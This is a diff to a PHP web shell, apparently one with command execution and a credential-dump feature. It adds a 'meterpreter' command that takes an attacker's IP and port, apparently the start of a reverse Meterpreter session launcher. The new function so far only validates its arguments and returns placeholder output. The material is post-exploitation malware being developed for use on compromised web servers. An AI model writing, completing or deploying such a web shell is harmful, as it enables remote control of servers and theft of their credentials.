@@ -3,6 +3,7 @@
 function featureShell($cmd, $cwd) {
     $stdout = array();
 
+    $cmd_args = explode(" ",$cmd);
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
         // pass
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
@@ -19,7 +20,9 @@ function featureShell($cmd, $cwd) {
         return featureCredentilasDump();
     } 
     
-    
+    elseif (preg_match('/^meterpreter\b/', $cmd)){
+        return featureMeterpreter($cmd);
+    }
     
     else {
         chdir($cwd);
@@ -101,6 +104,40 @@ function featureCredentilasDump(){
             'cwd' => getcwd()
         );
     }
+}
+
+function featureMeterpreter($cmd){
+    $args = explode(" ", $cmd);
+    $ip = $args[1];
+
+    if (filter_var($ip, FILTER_VALIDATE_IP) === false){
+        return array(
+            'stdout' => array('Invalid IP address. Usage: metrepreter ip port'),
+            'cwd' => getcwd()
+        );
+    }
+
+
+    $port = $args[2];
+    $num = intval($port);
+    if (is_numeric($port) && $num >= 1 && $num <= 65535){
+        return array(
+            'stdout' => array('Norm port'),
+            'cwd' => getcwd()
+        );
+    }
+    
+    else{
+        return array(
+            'stdout' => array('Invalid port. Usage: meterpreter ip port'),
+            'cwd' => getcwd()
+        );       
+    }
+
+    return array(
+        'stdout' => array($args[2]),
+        'cwd' => getcwd()
+    );
 }
 
 
@@ -223,7 +260,7 @@ if (isset($_GET["feature"])) {
             }
 
             #shell-content {
-                height: 500px;
+                height: 600px;
                 overflow: auto;
                 padding: 5px;
                 white-space: pre-wrap;
